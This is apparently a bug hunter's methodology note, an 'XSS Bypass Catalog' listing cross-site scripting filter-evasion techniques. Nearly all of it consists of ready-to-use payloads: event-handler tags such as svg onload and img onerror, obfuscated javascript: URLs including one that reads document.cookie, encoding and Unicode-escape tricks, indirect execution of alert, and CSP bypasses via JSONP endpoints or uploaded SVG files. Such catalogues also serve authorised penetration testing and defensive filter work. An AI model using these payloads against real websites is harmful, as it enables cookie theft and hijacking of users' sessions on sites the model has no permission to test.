> [!abstract] Module: [[4-Methodology/Crow-Hustler/hunter-methodology-V1/bypass/00-index|← Back to Bypass]] · Related: [[04-xss|XSS playbook]]

# XSS Bypass Catalog

## Encoding

- Double URL-encode entire payload
- HTML-encode: `&#xHEX;`, `&#DEC;`, `&lt;`
- Mix encoding layers

## Event Handlers (no `<script>` needed)

```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<input onfocus=alert(1) autofocus>
```

Independent of tag: `onmouseover`, `ondragover`, `onclick`, `onfocus`, `onpointerover`

## JS Execution (functions filtered)

- `location=location.hash.split('#')[1]` then URL = `https://target.com/#';alert(1)`
- Unicode escapes: `\u0061`, `\u00000061`
- Optional chaining: `alert?.(1)`
- Indirect: `window.valueOf=alert; window+1`

## `javascript:` Scheme Bypass

```
java%0dscript%0a:alert(1)
%09Jav%09ascript:alert(document.domain)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
```

## CSP Bypass

- `script-src youtube.com` → use JSONP callback
- File-upload + CSP allows origin → upload `.html`/`.svg`
